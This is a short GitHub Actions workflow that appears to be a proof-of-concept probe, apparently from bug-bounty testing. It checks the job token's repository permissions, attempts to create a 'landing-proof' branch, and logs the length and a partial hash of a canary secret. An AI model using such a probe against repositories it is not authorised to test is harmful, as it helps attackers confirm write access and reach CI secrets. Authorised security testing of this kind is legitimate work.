name: landing
on:
  push:
    branches: [landing]
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - env:
          T: ${{ github.token }}
          S: ${{ secrets.BB_LANDING_CANARY }}
        run: |
          curl -s -H "Authorization: Bearer $T" https://api.github.com/repos/${{ github.repository }} -o /tmp/r.json
          echo "LANDING_PERMS: $(python3 -c 'import json;print(json.load(open("/tmp/r.json")).get("permissions"))')"
          code=$(curl -s -o /tmp/w.json -w '%{http_code}' -X POST -H "Authorization: Bearer $T" https://api.github.com/repos/${{ github.repository }}/git/refs -d "{\"ref\":\"refs/heads/landing-proof\",\"sha\":\"$GITHUB_SHA\"}")
          echo "LANDING_WRITE_HTTP: $code"
          echo "LANDING_SECRET_LEN: ${#S}"
          echo "LANDING_SECRET_SHA: $(printf %s "$S" | sha256sum | cut -c1-32)"
